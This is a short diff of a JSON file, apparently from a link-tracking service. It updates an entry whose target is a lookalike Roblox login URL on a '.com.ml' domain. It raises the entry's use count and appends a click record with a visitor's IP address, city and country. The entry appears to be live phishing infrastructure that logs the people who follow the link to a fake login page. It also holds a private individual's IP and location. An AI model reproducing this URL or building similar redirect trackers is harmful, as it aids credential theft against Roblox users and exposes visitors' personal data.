@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 457,
+    "useCount": 458,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3768,6 +3768,14 @@
         "city": "Dortmund",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777069489008,
+        "ip": "181.46.137.205",
+        "country": "Argentina",
+        "city": "Quilmes",
+        "flag": "🇦🇷",
+        "countryCode": "AR"
       }
     ]
   },
